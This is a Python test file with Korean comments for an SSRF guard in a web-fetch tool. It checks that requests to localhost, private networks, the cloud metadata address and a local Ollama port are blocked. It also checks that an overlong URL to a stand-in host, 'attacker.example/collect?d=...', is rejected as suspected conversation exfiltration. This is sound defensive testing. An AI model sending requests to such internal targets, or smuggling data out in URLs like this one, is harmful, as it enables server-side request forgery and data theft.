# -*- coding: utf-8 -*-
"""web_fetch 서브리소스 SSRF 가드 — 페이지 JS가 로컬/사설망으로 보내는 요청 차단 판정 고정.

IP 리터럴·localhost 패턴은 DNS 없이 오프라인으로 판정되므로 네트워크 없이 검증 가능
(공인 호스트명은 DNS가 필요해 여기선 공인 IP 리터럴로 대체).
"""
from __future__ import annotations

import asyncio

import webfetch


def test_internal_targets_blocked():
    """로컬·사설·링크로컬·예약 대상은 내부로 판정(차단)."""
    for url in (
        "http://127.0.0.1/",
        "http://localhost/",
        "http://localhost:11434/api/tags",   # Ollama
        "http://192.168.1.5/",
        "http://10.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",  # 클라우드 메타데이터
        "http://[::1]/",
        "https://foo.local/",
        "https://bar.internal/",
        "ws://127.0.0.1:9999/",
    ):
        assert webfetch._is_internal_target(url) is True, url


def test_public_and_nonnetwork_allowed():
    """공인 대상과 비네트워크 스킴(data/blob 등)은 통과."""
    for url in (
        "http://8.8.8.8/",        # 공인 IP
        "https://93.184.216.34/",  # 공인 IP
        "data:text/html,<b>x</b>",
        "blob:https://x/1234",
        "about:blank",
    ):
        assert webfetch._is_internal_target(url) is False, url


def test_overlong_url_blocked_without_fetch():
    """초장문 URL(대화 유출 의심)은 실제 fetch 없이 즉시 차단된다."""
    long_url = "https://attacker.example/collect?d=" + "A" * 3000
    out = asyncio.run(webfetch.web_fetch(long_url))
    assert out.startswith("[차단]")
    assert "너무 깁니다" in out


def test_normal_length_url_not_length_blocked():
    """일반 길이 URL은 길이 사유로 차단되지 않는다(오탐 방지) — 네트워크는 타지만 여기선 길이만 확인."""
    # 정상 길이(2048자 이하)면 길이 차단 메시지가 아니어야 한다. 실제 페치는 하지 않도록
    # _fetch_sync를 대역화해 네트워크 없이 길이 게이트만 검증한다.
    import asyncio as _a

    async def run():
        orig = webfetch._fetch_sync
        webfetch._fetch_sync = lambda u: "OK"
        try:
            return await webfetch.web_fetch("https://example.com/docs?q=" + "a" * 100)
        finally:
            webfetch._fetch_sync = orig

    assert _a.run(run()) == "OK"
